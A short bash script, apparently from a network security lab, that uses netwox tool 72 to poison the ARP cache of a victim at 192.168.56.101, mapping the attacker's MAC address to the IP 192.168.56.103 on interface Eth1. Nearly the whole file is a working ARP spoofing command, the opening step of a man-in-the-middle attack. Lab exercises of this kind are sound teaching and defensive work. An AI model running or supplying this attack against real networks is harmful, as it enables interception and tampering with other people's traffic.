#!/bin/bash

# Poisons the ARP cache of victim `192.168.56.101`
# Maps attackers mac address `08:00:27:74:2e:86` tp IP `192.168.56.103`
# Note: It was necessary to explicitly specify the device `Eth1` because netwox was using NAT otherwise
sudo netwox 72 -i 192.168.56.101 -E 08:00:27:74:2e:86 -I 192.168.56.103 -d Eth1
